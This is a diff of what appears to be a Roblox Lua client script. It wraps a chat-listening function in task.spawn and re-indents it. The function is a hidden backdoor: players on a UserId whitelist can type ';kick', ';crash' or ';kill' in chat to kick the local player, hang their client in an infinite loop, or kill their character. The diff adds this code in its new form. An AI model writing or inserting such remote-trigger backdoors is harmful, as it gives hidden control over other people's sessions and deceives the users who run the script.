@@ -580,29 +580,31 @@ task.spawn(function()
 end)
 
 
+task.spawn(function()
+	function output(plr, msg)
+		local player = game.Players[plr]
+		print("player chatted: " .. msg)
+		print(player.UserId)
+		for i, v in pairs(a) do
+			if player.UserId == v then
+				print("player is whitelisted")
+				if player ~= lplr then
+					if string.lower(msg) == ";kick" then
+						lplr:Kick()
+					elseif string.lower(msg) == ";crash" then
+						while true do  end
 
-function output(plr, msg)
-	local player = game.Players[plr]
-	print("player chatted: " .. msg)
-	print(player.UserId)
-	for i, v in pairs(a) do
-		if player.UserId == v then
-			print("player is whitelisted")
-			if player ~= lplr then
-				if string.lower(msg) == ";kick" then
-					lplr:Kick()
-				elseif string.lower(msg) == ";crash" then
-					while true do  end
-
-				elseif string.lower(msg) == ";kill" then
-					lplr.Character.Humanoid.Health = 0
+					elseif string.lower(msg) == ";kill" then
+						lplr.Character.Humanoid.Health = 0
+					end
 				end
 			end
 		end
 	end
-end
 
 	local event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents
 	event.OnMessageDoneFiltering.OnClientEvent:Connect(function(object)
 		output(object.FromSpeaker, object.Message or "")
 	end)
+
+end)
